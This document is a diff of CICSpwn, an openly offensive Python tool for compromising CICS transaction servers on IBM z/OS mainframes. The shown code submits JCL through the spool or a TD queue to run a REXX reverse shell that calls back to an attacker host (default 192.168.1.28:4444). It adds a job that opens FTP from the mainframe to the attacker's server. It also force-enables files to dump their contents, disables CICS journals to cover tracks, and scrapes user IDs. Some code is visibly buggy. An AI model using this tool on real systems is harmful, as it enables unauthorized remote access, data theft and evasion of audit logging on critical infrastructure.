@@ -9,10 +9,12 @@ import time
 import datetime
 import string
 import random
+import platform
 from random import randrange
-from py3270wrapper import WrappedEmulator
 import signal
 import argparse 
+from py3270 import Emulator,CommandError,FieldTruncateError,TerminatedError,WaitError,KeyboardStateError,FieldTruncateError,x3270App,s3270App
+#from py3270wrapper import WrappedEmulator
 
 ####################################################################################
 #			              *******  CICSpwn  ********                             
@@ -26,7 +28,8 @@ import argparse
 #        SPOOL=YES in SIT table
 #        Or TDQueue pointing to INTRDR (which was defined in CICS start up JCL)
 #        Record length of the JCL must not exceed 80 characters 
-#                                                              
+#
+# Example of TSO commands : LU (display user privileges)                                                           
 # Created by: Ayoul3 (@ayoul3__              	
 # Credit for the reverse shell goes to @mainframed767 (https://github.com/mainframed)
 # Copyright GPL 2016                                             	  
@@ -38,14 +41,16 @@ SLEEP = 0.5
 AUTHENTICATED = False
 DO_AUTHENT = False
 
-# To do:
+# TO DO:
 #   Write a CICS SHELL in COBOL
 #   Distinguish VTAM authentication from CICS authentication
-#   Change variable names
-#   Add space automatically to requests
 #   Beautify the code...
 #   Handle errors
-#   Document the code
+#   job to get a file
+#   job to put a file
+#   trail everything in log file
+#   clean everything
+#   document more
 
 
 class bcolors:
@@ -58,6 +63,8 @@ class bcolors:
     CYAN="\033[36m"
     PURPLE="\033[35m"
     WHITE="";
+    DARKGREY = '\033[1;30m'
+    DARKBLUE = '\033[0;34m'
 
     def disable(self):
         self.HEADER = ''
@@ -66,6 +73,104 @@ class bcolors:
         self.YELLOW = ''
         self.RED = ''
         self.ENDC = ''
+
+# Override some behaviour of py3270 library
+class EmulatorIntermediate(Emulator):
+	def __init__(self, visible=True, delay=0):
+		Emulator.__init__(self, visible)
+		self.delay = delay
+
+	def send_enter(self): # Allow a delay to be configured
+		self.exec_command('Enter')
+		if self.delay > 0:
+			sleep(self.delay)
+    
+	def send_clear(self): # Allow a delay to be configured
+		self.exec_command('Clear')
+		if self.delay > 0:
+			sleep(self.delay)
+            
+	def send_eraseEOF(self): # Allow a delay to be configured
+		self.exec_command('EraseEOF')
+		if self.delay > 0:
+			sleep(self.delay)
+      
+	def send_pf11(self):
+		self.exec_command('PF(11)')
+            
+	def screen_get(self):
+		response = self.exec_command('Ascii()')
+		if ''.join(response.data).strip()=="":
+		    sleep(0.3)
+		    return self.screen_get()
+		return response.data
+
+	# Send text without triggering field protection
+	def safe_send(self, text):
+		for i in xrange(0,len(text)):
+			self.send_string(text[i])
+			if self.status.field_protection == 'P':
+				return False # We triggered field protection, stop
+		return True # Safe
+
+	# Fill fields in carefully, checking for triggering field protections
+	def safe_fieldfill(self, ypos, xpos, tosend, length):
+		if length - len(tosend) < 0:
+			raise FieldTruncateError('length limit %d, but got "%s"' % (length, tosend))
+		if xpos is not None and ypos is not None:
+			self.move_to(ypos, xpos)
+		try:
+			self.delete_field()
+			if safe_send(self, tosend):
+				return True # Hah, we win, take that mainframe
+			else:
+				return False # we entered what we could, bailing
+		except CommandError, e:
+			# We hit an error, get mad
+			return False
+			# if str(e) == 'Keyboard locked':
+
+	# Search the screen for text when we don't know exactly where it is, checking for read errors
+	def find_response(self, response):
+		for rows in xrange(1,int(self.status.row_number)+1):
+			for cols in xrange(1,int(self.status.col_number)+1-len(response)):
+				try:
+					if self.string_found(rows, cols, response):
+						return True
+				except CommandError, e:
+					# We hit a read error, usually because the screen hasn't returned
+					# increasing the delay works
+					sleep(self.delay)
+					self.delay += 1
+					whine('Read error encountered, assuming host is slow, increasing delay by 1s to: ' + str(self.delay),kind='warn')
+					return False
+		return False
+	
+	# Get the current x3270 cursor position
+	def get_pos(self):
+		results = self.exec_command('Query(Cursor)')
+		row = int(results.data[0].split(' ')[0])
+		col = int(results.data[0].split(' ')[1])
+		return (row,col)
+
+	def get_hostinfo(self):
+		return self.exec_command('Query(Host)').data[0].split(' ')
+
+
+def logo():
+
+  print bcolors.BLUE + '''
+  
+       ::::::::   :::::::::::   ::::::::    ::::::::   ::::::::: :::       :::::::    ::: 
+      :+:    :+:      :+:      :+:    :+:  :+:    :+:  :+:    :+::+:       :+::+:+:   :+: 
+      +:+             +:+      +:+         +:+         +:+    +:++:+       +:+:+:+:+  +:+ 
+      +#+             +#+      +#+         +#++:++#++  +#++:++#+ +#+  +:+  +#++#+ +:+ +#+ '''+bcolors.DARKBLUE+''' 
+      +#+             +#+      +#+                +#+  +#+       +#+ +#+#+ +#++#+  +#+#+# 
+      #+#    #+#      #+#      #+#    #+#  #+#    #+#  #+#        #+#+# #+#+# #+#   #+#+# 
+       ########   ###########   ########    ########   ###         ###   ###  ###    #### 
+      
+                            The tool for some CICS p0wning !\t\tAuthor: @Ayoul3__\n'''+ bcolors.ENDC
+  
 
 def sleep():
   time.sleep(SLEEP)
@@ -102,7 +207,7 @@ def rand_name(size=8, chars=string.ascii_letters):
 def format_request(request):
     i =0;
     while i + len(request) < 80:
-       request +=request +" "
+       request +=" "
     
     return request
 def show_screen():
@@ -111,19 +216,25 @@ def show_screen():
         print d
         
 def whine(text, kind='clear', level=0):
-	typdisp = ''
-	lvldisp = ''
-	color =''
-	if kind == 'warn': typdisp = '[!] ';color=bcolors.YELLOW
-	elif kind == 'info': typdisp = '[+] ';color=bcolors.WHITE
-	elif kind == 'err': typdisp = '[#] ';color=bcolors.RED
-	elif kind == 'good': typdisp = '[*] ';color=bcolors.GREEN
-	if level == 1: lvldisp = "\t"
-	elif level == 2: lvldisp = "\t\t"
-	elif level == 3: lvldisp = "\t\t\t"
-	print color+lvldisp+typdisp+text+ (bcolors.ENDC if color!="" else "");
+  """
+    Handles screen messages display
+  """
+  typdisp = ''
+  lvldisp = ''
+  color =''
+  if kind == 'warn': typdisp = '[!] ';color=bcolors.YELLOW
+  elif kind == 'info': typdisp = '[+] ';color=bcolors.WHITE
+  elif kind == 'err': typdisp = '[#] ';color=bcolors.RED
+  elif kind == 'good': typdisp = '[*] ';color=bcolors.GREEN
+  if level == 1: lvldisp = "\t"
+  elif level == 2: lvldisp = "\t\t"
+  elif level == 3: lvldisp = "\t\t\t"
+  print color+lvldisp+typdisp+text+ (bcolors.ENDC if color!="" else "");
 
 def connect_zOS(em, target):
+    """
+    Connects to z/OS server. If Port 992 is used, instructs 3270 to use SSL
+    """
     whine('Connecting to target '+target,kind='info')
     if "992" in target or "10024" in target:
         em.connect('L:'+target)
@@ -135,11 +246,11 @@ def connect_zOS(em, target):
         sys.exit(1)
 
 def do_authenticate(userid, password, pos_pass):
-   #~ if cesn:
-       #~ em.move_to(1,2)
-       #~ em.safe_send("CESN                                           ");
-       #~ em.send_enter();
-       #~ sleep()   
+   """
+       It starts writting the userid, then moves to pos_pass to write the password
+       Works for VTAM and CICS authentication
+   """
+   
    posx, posy = em.get_pos()
       
    em.safe_send(results.userid)   
@@ -158,6 +269,12 @@ def do_authenticate(userid, password, pos_pass):
     
              
 def check_valid_applid(applid, do_authent, method = 1):
+    """
+       Tries to access a CICS app in VTAM screen. If VTAM needs
+       authentication, it calls do_authenticate()
+       If CICS appid is valid, it tries to access the CICS terminal
+    """
+    
     em.send_string(applid) #CICS APPLID in VTAM
     em.send_enter()   
     sleep()
@@ -166,7 +283,6 @@ def check_valid_applid(applid, do_authent, method = 1):
         pos_pass=1;
         data = em.screen_get()   
         for d in data:
-            print "eeed"
             if "Password" in d or "Code" in d:
                 break;
             else:
@@ -204,8 +320,12 @@ def check_valid_applid(applid, do_authent, method = 1):
         return check_valid_applid(applid, do_authent, method)
 
 def query_cics(request, verify, line):
+    """
+      Function to send a request to CICS and see if it worked.
+      It does not support double send (required for CECI)
+    """
     em.move_to(1,2);
-    em.safe_send(request+'                                              ');
+    em.safe_send(format_request(request));
     em.send_enter();
     
     data = em.screen_get()
@@ -215,6 +335,10 @@ def query_cics(request, verify, line):
         return False
 
 def get_cics_value(request, identifier, double_enter=False):
+    """
+      Send a request to CICS, stores the result in a variable then returns it
+      supports double send required by CECI
+    """
     em.move_to(1,2);
     for i in identifier:
         request += " "+i+"(&"+i[:3]+")"
@@ -222,7 +346,7 @@ def get_cics_value(request, identifier, double_enter=False):
         whine("Request longer than terminal screen",'err')
         sys.exit();
     
-    em.safe_send(request+'                                              ');
+    em.safe_send(format_request(request));
     em.send_enter();
     
     if double_enter:
@@ -240,8 +364,17 @@ def get_cics_value(request, identifier, double_enter=False):
     return out;
 
 def query_cics_scrap(request, pattern, length, depth, scrolls):
+    """
+      Sometimes values cannot be stored in variables, so we need to scrap
+      the screen to get their values.
+      @pattern: pattern preceding the value
+      @length: length of the value retrieved
+      @depth : click on the value to get more details 
+      @scrolls: how many F11 before getting the pattern on screen
+    """
     em.move_to(1,2);
-    em.safe_send(request+'                                              ');
+    
+    em.safe_send(format_request(request));
     em.send_enter();
     out = []
     i =0;
@@ -269,9 +402,13 @@ def query_cics_scrap(request, pattern, length, depth, scrolls):
       return None;    
 
 def send_cics(request, double=False):
+    """
+      Sends request to CICS
+      handles double send required by CECI
+    """
     em.send_clear();
     em.move_to(1,2);
-    em.safe_send(request+'                                              ');
+    em.safe_send(format_request(request));
     em.send_enter();
     
     if double:
@@ -280,14 +417,17 @@ def send_cics(request, double=False):
     if "RESPONSE: NORMAL" in data[22]:
         return True
     else:
+        whine(data[22],'err')
         return False
 
 def get_hql_files():
+    """
+      Called by get_infos(). retrieves the HLQ of files handled by CICS
+    """
+    
     em.move_to(1,2);
     
-    request = "CEMT I DSNAME"
-    
-    em.safe_send(request+'                                              ');
+    em.safe_send(format_request("CEMT I DSNAME"));
     em.send_enter();
     
     data = em.screen_get()
@@ -302,12 +442,13 @@ def get_hql_files():
     return None
     
 def get_hql_libraries():
+    """
+      Called by get_infos(). retrieves the HLQ of CICS install libraries
+    """
     found_dfhrpl= False;
     em.move_to(1,2);
     
-    request = "CEMT I LIBRARY"
-    
-    em.safe_send(request+'                                              ');
+    em.safe_send(format_request("CEMT I LIBRARY"));
     em.send_enter();
     
     data = em.screen_get()
@@ -324,10 +465,13 @@ def get_hql_libraries():
     em.send_pf3()
     return None
 def get_users():
+    """
+      Called by get_infos(). retrieves active users
+    """
     out = []
     em.move_to(1,2);
-    request = "CEMT I TASK"
-    em.safe_send(request+'                                              ');
+
+    em.safe_send(format_request("CEMT I TASK"));
     em.send_enter();
     
     data = em.screen_get()
@@ -340,11 +484,17 @@ def get_users():
     return out
 
 def get_version():
+   """
+      Called by get_infos(). retrieves current version of CICS
+    """
    version = query_cics_scrap("CEMT I SYS", "Cicstslevel(", 8, 0, 0 )
    version = version.strip("0").replace("0",".")
    return version     
    
 def get_infos():
+    """
+      retrieves meaningful information about CICS
+    """
     cemt = True
     ceci = True
     cecs = False
@@ -460,7 +610,9 @@ def get_infos():
     #MQ: ???        
    
 def get_transactions(transid):
-    
+     """
+        List enabled transactions available on CICS
+     """
      em.send_clear()
      em.move_to(1,2);
      
@@ -491,7 +643,9 @@ def get_transactions(transid):
 
 
 def get_files(filename):
-    
+     """
+        Get all files defined in CICS
+     """ 
      em.send_clear()
      em.move_to(1,2);
           
@@ -533,14 +687,19 @@ def get_files(filename):
        whine('No files matched the pattern, start again or make sure you have access to the CEMT utility (-i option)','err')
 
 def fetch_content(filename, ridfld, keylength):
+    """
+        Gets the record ridfld in a file.
+        ridfld is they index key in a VSAM file
+    """
     em.move_to(1,2);
-    request = 'CECI READ FI('+filename.upper()+') RI('+str(ridfld)+') GTE INTO(&FI)'
-    em.safe_send(request)
+    req_read = 'CECI READ FI('+filename.upper()+') RI('+str(ridfld)+') GTE INTO(&FI)'
+    em.safe_send(req_read)
     em.send_enter()
     em.send_enter() # Send twice Enter to confirm transaction
     
     data = em.screen_get();
     if "NORMAL" not in data[22]:
+        whine(data[22],'err')
         return -1    
     
     em.send_pf5()   # Access Variable definition
@@ -567,6 +726,9 @@ def fetch_content(filename, ridfld, keylength):
     return out[0:keylength]
     
 def get_file_content():
+    """
+        If the file is closed or disabled, it activates it before retrieving its content
+    """
     file_enabled, file_readable, file_opened = False, False, False;
     keylength, recordsize = 0, 0
     em.send_clear()
@@ -579,8 +741,8 @@ def get_file_content():
     ridfld = "000000";
     
     ## get file properties ##
-    request = 'CEMT I READ FI('+filename.upper()+')                                  '
-    em.safe_send(request)
+    req_list_file = 'CEMT I READ FI('+filename.upper()+')'
+    em.safe_send(format_request(req_list_file))
     em.send_enter()
     data = em.screen_get()
     if "Ope " in data[2]:
@@ -594,17 +756,19 @@ def get_file_content():
     else:
         whine("File "+results.filename+" is lacking attributes to be readable. Changing that via CEMT", 'info')
         em.move_to(1,2);
-        request = 'Set READ FI('+filename.upper()+') OPE ENA                           '
-        em.safe_send(request)
+        req_set_file = 'Set READ FI('+filename.upper()+') ENA OPE'
+        em.safe_send(format_request(req_set_file))
         em.send_enter()
         data = em.screen_get();
-        if "NORMAL" in data[2]:
+        if "NORMAL" in data[22]:
             whine("File "+results.filename+" is enabled, open, and readable", 'good')
-    
+        else:
+            whine('Cannot change file attributes','err')
+            whine(data[22],'err')
     # getting key length and record size. Can only do when then the file is enabled and opened
     em.move_to(1,2);
-    request = 'CEMT I READ FI('+filename.upper()+')                                  '
-    em.safe_send(request)
+    req_list_file = 'CEMT I READ FI('+filename.upper()+')'
+    em.safe_send(format_request(req_list_file))
     em.send_enter()
     
     # Display more info about the file
@@ -643,7 +807,9 @@ def get_file_content():
          
 
 def dummy_jcl(lhost):
-    
+    """
+        PoC that executes an FTP to verify Job submission and network filtering
+    """
     if results.surrogat_user:
       job_card = '//CICSUSEA JOB (INTRDR),USER='+results.surrogat_user+',CLASS=A'      
     else:
@@ -686,12 +852,19 @@ def dummy_jcl2(lhost):
     return jcl
     
 def reverse_jcl(lhost, username="CICSUSEB"):
-	
-	job_name = username
-	tmp = rand_name(randrange(3,7))
-	
+  """
+     JOB that writes a reverse shell in REXX to a temporary file CICSUSER.*
+     then executes said file
+  """
+  job_name = username
+  tmp = rand_name(randrange(3,7))
   
-	jcl_code = "//"+job_name.upper()+" JOB ("+"123456768"+"""),CLASS=A
+  if results.surrogat_user:
+      job_card = '//'+job_name.upper()+' JOB (123456),USER='+results.surrogat_user+',CLASS=A'      
+  else:
+      job_card = '//'+job_name.upper()+' JOB (123456),CLASS=A'      
+  
+  jcl_code = job_card+"""
 //CREATERX  EXEC PGM=IEBGENER
 //SYSPRINT   DD SYSOUT=*
 //SYSIN      DD DUMMY
@@ -737,9 +910,37 @@ def reverse_jcl(lhost, username="CICSUSEB"):
 //SYSIN    DD  DUMMY
 /*EOF
 """
-	return jcl_code
+  return jcl_code
 
+def ftp_jcl(lhost):
+	"""
+     JOB that initiates an FTP connection from the mainframe to your FTP server
+     
+  """
+	job_name = username
+	tmp = rand_name(randrange(3,7))
+	
+  
+	jcl_code = "//"+job_name.upper()+" JOB ("+"123456768"+"""),CLASS=A
+//FTP00001 EXEC PGM=IKJEFT01,DYNAMNBR=50         
+//SYSTSPRT DD   SYSOUT=*                         
+//SYSIN    DD   DUMMY                             
+//SYSPRINT DD   DUMMY                             
+//SYSTSIN  DD  *                                 
+FTP (EXIT
+"""+lhost.split(":")[0]+""" """+lhost.split(":")[1]+"""
+ayoul3
+ayoul3
+ascii
+pwd
+/*
+"""
+	return jcl_code
+    
 def set_mixedCase(em):
+    """
+        Set the terminal to mixed case in case the JCL submitted containes OMVS code
+    """
     whine('Setting the current terminal to mixed case',kind='info')
     em.safe_send('CEMT') #CICS APPLID in VTAM
     em.send_enter()
@@ -749,8 +950,8 @@ def set_mixedCase(em):
     else:
         whine('CEMT Inquire is not available',kind='err')
         return -1
-    request = 'CEMT I TASK'
-    em.safe_send(request)
+    
+    em.safe_send(format_request('CEMT I TASK'))
     em.send_enter()
     data = em.screen_get()
     for d in data:
@@ -765,8 +966,8 @@ def set_mixedCase(em):
     em.move_to(1,2);
     sleep()
     
-    request = 'CECI SET TERM('+termID+') NOUCTRAN'
-    em.safe_send(request)
+    req_set_term = 'CECI SET TERM('+termID+') NOUCTRAN'
+    em.safe_send(format_request(req_set_term))
     em.send_enter()
     em.send_enter()
     whine('Current terminal is NOW mixed case',kind='good')
@@ -775,11 +976,18 @@ def set_mixedCase(em):
     
 
 def open_spool():
-    
+    """
+        Opens a spool on the LOCAL node
+    """
     token = None
     em.move_to(1,2);
-    request = "CECI SPOOLOPEN OUTPUT USERID('INTRDR  ') NODE('LOCAL   ') TOKEN(&TOKTEST)       "
-    em.safe_send(request)
+    if results.node:
+       node = results.node.upper()
+    else:
+       node = 'LOCAL'
+       
+    req_open_spool = "CECI SPOOLOPEN OUTPUT USERID('INTRDR  ') NODE('"+node+"') TOKEN(&TOKTEST)"
+    em.safe_send(format_request(req_open_spool))
     em.send_enter()
     em.send_enter()
         
@@ -796,16 +1004,22 @@ def open_spool():
             break
     if "RESPONSE: NORMAL" not in data[22]:
         whine('Could not grab a valid token...a good chance the spool disabled, use -i to verify','err')
-        
+        whine(data[22],'err')
     return token
 
 def spool_write(token, jcl):
+    """
+        Submits the JCL one record at a time via SPOOLWrite
+    """
     whine('Writting JCL to the spool (might take a few seconds)','info')      
     
     # write each line in a variable
     i = 0;
     total = jcl.count("\n")
     for j in jcl.split("\n"):        
+        if len(j) > 80:
+            whine("JCL dataset cannot exceed 80 bytes per line",'err');
+            sys.exit()
         # Go the variable screen
         em.send_pf5()
                 
@@ -813,10 +1027,10 @@ def spool_write(token, jcl):
         em.send_eraseEOF()
         em.send_enter();
         
-        request = "&SQLKHDS  +00080"
-        em.safe_send(request);
+        def_var = "&SQLKHDS  +00080"
+        em.safe_send(def_var);
         em.send_enter();
-        #sleep()
+        
         em.move_to(7,2)
         em.send_enter();
         k= 0;
@@ -835,8 +1049,8 @@ def spool_write(token, jcl):
         # back to the normal screen
         em.send_enter();
         em.move_to(1,2)
-        request = 'SPOOLWRITE TOKEN(&TOKTEST) FROM(&SQLKHDS) FLENGTH(80)                                '
-        em.safe_send(request);
+        req_spool_write = 'SPOOLWRITE TOKEN(&TOKTEST) FROM(&SQLKHDS) FLENGTH(80)'
+        em.safe_send(format_request(req_spool_write));
         em.send_enter();  
         em.send_enter();
         
@@ -850,6 +1064,7 @@ def spool_write(token, jcl):
         data = em.screen_get();
         if "RESPONSE: NORMAL" not in data[22]:
             whine('Received error while writing JCL ('+str(i)+'):\n'+data[22],'err')
+            whine(data[22],'err')
             sys.exit();
  
     whine('JCL Written successfully to the spool','good',1)   
@@ -867,8 +1082,8 @@ def spool_write2(token, jcl):
     em.send_eraseEOF()
     em.send_enter();
     
-    request = "&sqlkhds  "+str(total)
-    em.safe_send(request);    
+    def_var = "&sqlkhds  "+str(total)
+    em.safe_send(def_var);    
     em.send_enter();
     
     em.move_to(7,2)
@@ -901,20 +1116,26 @@ def spool_write2(token, jcl):
     return 0
 
 def close_spool():
-    
+    """
+        Closes the spool
+    """
     em.move_to(1,2)
-    request = 'SPOOLCLOSE TOKEN(&TOKTEST)                                                         '
-    em.safe_send(request);
+    req_close_spool = 'SPOOLCLOSE TOKEN(&TOKTEST'
+    em.safe_send(format_request(req_close_spool));
     em.send_enter();  
     em.send_enter();
     
     data = em.screen_get()  
     if "RESPONSE: NORMAL" not in data[22]:
             whine('Problem submitting the spool','err')
+            whine(data[22],'err')
             sys.exit();
     whine('JOB submitted successfully to JES. Might take a few seconds to connect back','good',1)
 
 def write_tdqueue(jcl):
+    """
+        Writes to a TDQueue pointing to INTRDR
+    """
     em.move_to(1,2);
     queue='ssss'
     if not results.queue:
@@ -930,8 +1151,8 @@ def write_tdqueue(jcl):
     em.send_pf3();
      
     em.move_to(1,2)
-    request = "CECI ENQ RESOURCE("+queue+")                                                 "
-    em.safe_send(request)
+    req_enq_tdq = "CECI ENQ RESOURCE("+queue+")"
+    em.safe_send(format_request(req_enq_tdq))
     em.send_enter();
     
     whine('Writing to the internal reader','info')
@@ -947,8 +1168,8 @@ def write_tdqueue(jcl):
         em.send_eraseEOF()
         em.send_enter();
         
-        request = "&SQLKHDS  +00080"
-        em.safe_send(request);
+        def_var = "&SQLKHDS  +00080"
+        em.safe_send(def_var);
         em.send_enter();
         #sleep()
         
@@ -961,8 +1182,8 @@ def write_tdqueue(jcl):
         # back to the normal screen
         em.send_enter();
         em.move_to(1,2)
-        request = "WriteQ TD Queue("+queue+") FROM(&SQLKHDS) LENGTH(80)                                           "
-        em.safe_send(request);
+        req_write_tdq = "WriteQ TD Queue("+queue+") FROM(&SQLKHDS) LENGTH(80)"
+        em.safe_send(format_request(req_write_tdq));
         em.send_enter();  
         em.send_enter();
         
@@ -977,14 +1198,17 @@ def write_tdqueue(jcl):
             whine('Received error while writing JCL ('+str(i)+'):\n'+data[22],'err')
             sys.exit();
      
-    request = "CECI DEQ RESOURCE("+queue+")                                                 "
-    em.safe_send(request)
+    req_deq_tdq = "CECI DEQ RESOURCE("+queue+")"
+    em.safe_send(format_request(req_deq_tdq))
     em.send_enter();
     whine('JCL Written to TDqueue, it should be executed any second','good',1)
     
   
 def submit_job(kind,lhost="192.168.1.28:4444"):
-    
+    """
+        calls open_spool, spool_write and spool_close to submit a JOB.
+        if open_spool fails, calls write_tdqueue
+    """
     if results.jcl and kind=="custom":
        f = open(results.jcl,"r")
        lines = f.readlines()
@@ -995,6 +1219,9 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
         jcl = dummy_jcl(lhost);
     elif kind=="reverse":
         jcl = reverse_jcl(lhost)
+    elif kind=="ftp":
+        jcl = ftp_jcl(lhost)
+    
         
     token = open_spool();
     #token = None
@@ -1008,11 +1235,14 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
 
 
 def activate_transaction(ena_trans):
+    """
+        Activates a transaction
+    """
     em.move_to(1,2);
     trans_ena  = False
     ## get transaction properties ##
-    request = 'CEMT I TRANS('+ena_trans.upper()+')                                  '
-    em.safe_send(request)
+    req_list_trans = 'CEMT I TRANS('+ena_trans.upper()+')'
+    em.safe_send(format_request(req_list_trans))
     em.send_enter()
    
     data = em.screen_get()
@@ -1022,19 +1252,22 @@ def activate_transaction(ena_trans):
         
     else:
         em.move_to(1,2);
-        request = 'CEMT Set TRANSACTION('+ena_trans.upper()+') ENA                           '
-        em.safe_send(request)
+        req_set_trans = 'CEMT Set TRANSACTION('+ena_trans.upper()+') ENA'
+        em.safe_send(format_request(req_set_trans))
         em.send_enter()
         data = em.screen_get();
         if "NORMAL" in data[2]:
             whine("Transaction "+ena_trans+" is enabled and open", 'good')
 
 def disable_journal():
+    """
+        Disables logging in CICS (except for system logs)
+    """
     number_journals = 0;
     all_journals = 0;
     em.move_to(1,2);
-    request = "CEMT S JOURNAL ALL DIS"
-    em.safe_send(request+'                                              ');
+    req_set_jour = "CEMT S JOURNAL ALL DIS"
+    em.safe_send(format_request(req_set_jour));
     em.send_enter();
     
     data = em.screen_get()
@@ -1054,6 +1287,9 @@ def disable_journal():
 
         
 def fetch_userids():
+    """
+        Looks in different menus for userids
+    """
     tcl_u = query_cics_scrap("CEMT I TCL", "Installu(", 8, 0, 0)
     if not tcl_u:
       tcp_u = query_cics_scrap("CEMT I TCPIPSERV", "Installusrid(", 8, 1, 1)
@@ -1070,7 +1306,9 @@ def fetch_userids():
     print db2_u if db2_u else '';
     
 def check_surrogat(surrogat_user):
-    
+    """
+        use CECI QUERY Security to check if CICS region ID can impersonate another user
+    """
     variables = ["READ"]
     read = get_cics_value('CECI QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
     read = ''.join(read)
@@ -1175,6 +1413,10 @@ def main(results):
     
 # not used
 def check_VTAM(em):
+	"""
+        Checks if we are really in VTAM
+        Not used
+	"""
 	whine('Checking ifactivate in VTAM',kind='info')
 	#Test command enabled in the session-level USS table ISTINCDT, should always work
 	em.send_string('IBMTEST')
@@ -1200,6 +1442,25 @@ def check_VTAM(em):
 
 if __name__ == "__main__" :
     
+    logo();
+    
+        # Set the emulator intelligently based on your platform
+    if platform.system() == 'Darwin':
+      class WrappedEmulator(EmulatorIntermediate):
+        x3270App.executable = 'x3270'
+        s3270App.executable = 's3270'
+    elif platform.system() == 'Linux':
+      class WrappedEmulator(EmulatorIntermediate):
+        x3270App.executable = 'x3270'
+        s3270App.executable = 's3270'
+    elif platform.system() == 'Windows':
+      class WrappedEmulator(EmulatorIntermediate):
+        #x3270_executable = 'Windows_Binaries/wc3270.exe'
+        x3270App.executable = 'wc3270.exe'
+    else:
+      logger('Your Platform:', platform.system(), 'is not supported at this time.',kind='err')
+      sys.exit(1)    
+    
     signal.signal(signal.SIGINT, signal_handler)
 
     parser = argparse.ArgumentParser(description='CicsPwn: a tool to pentest CICS transaction servers on z/OS')
@@ -1218,8 +1479,10 @@ if __name__ == "__main__" :
     parser.add_argument('-q','--quiet',help='Remove Trailing and journal before performing any action',action='store_true',default=False,dest='journal')
     parser.add_argument('-u','--userids',help='Scrape userids found in different menus',action='store_true',default=False,dest='userids')
     parser.add_argument('-g','--surrogat',help='Checks wether you can impersonate another user when submitting a job', default=False,dest='surrogat_user')
-    parser.add_argument('-s','--submit',help='Submit JCL to CICS server. Specify: dummy,reverse,custom (need -j option),cicsshell',dest='submit')
+    parser.add_argument('-s','--submit',help='Submit JCL to CICS server. Specify: dummy,reverse,custom (need -j option),cicsshell,ftp',dest='submit')
     parser.add_argument('--queue',help='Provides the name of the TD queue to submit a JOB',dest='queue')
+    parser.add_argument('--ftp-cmds',help='List of ftp commands to execute',dest='ftp_cmds')
+    parser.add_argument('--node',help='System node name where the JOB should be submitted (works only with Spool functions)',dest='node')
 
     parser.add_argument('-l','--lhost',help='Remote server to call back to for reverse shell (host:port)',dest='lhost')
     parser.add_argument('-j','--jcl',help='Custom JCL file to provide',dest='jcl')
